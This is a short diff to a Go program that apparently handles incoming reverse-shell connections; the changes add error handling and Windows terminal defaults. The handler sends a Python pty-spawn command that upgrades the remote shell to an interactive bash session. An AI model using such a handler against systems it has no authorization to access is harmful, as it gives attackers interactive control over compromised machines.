@@ -5,6 +5,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"runtime"
 	"syscall"
 	"time"
 
@@ -45,14 +46,17 @@ func handleConnection(conn net.Conn) {
 	var err error // 声明err变量
 
 	// 设置终端为原始模式
-	oldState, _ := term.MakeRaw(int(os.Stdin.Fd()))
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		fmt.Println("Error setting terminal to raw mode:", err)
+		return
+	}
 	defer term.Restore(int(os.Stdin.Fd()), oldState) // 恢复终端状态
 
 	// 启动一个新的bash会话
 	_, err = conn.Write([]byte("python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"))
 	if err != nil {
 		fmt.Println("错误:", err)
-		term.Restore(int(os.Stdin.Fd()), oldState)
 		os.Exit(1)
 	}
 
@@ -60,10 +64,16 @@ func handleConnection(conn net.Conn) {
 	time.Sleep(1 * time.Second)
 
 	// 获取终端的行数和列数
-	width, height, err := term.GetSize(int(os.Stdin.Fd()))
-	if err != nil {
-		fmt.Println("Error getting terminal size:", err)
-		return
+	var width, height int
+	if runtime.GOOS == "windows" {
+		// 在 Windows 上使用默认值
+		width, height = 80, 24
+	} else {
+		width, height, err = term.GetSize(int(os.Stdin.Fd()))
+		if err != nil {
+			fmt.Println("Error getting terminal size:", err)
+			return
+		}
 	}
 
 	// 发送初始化命令
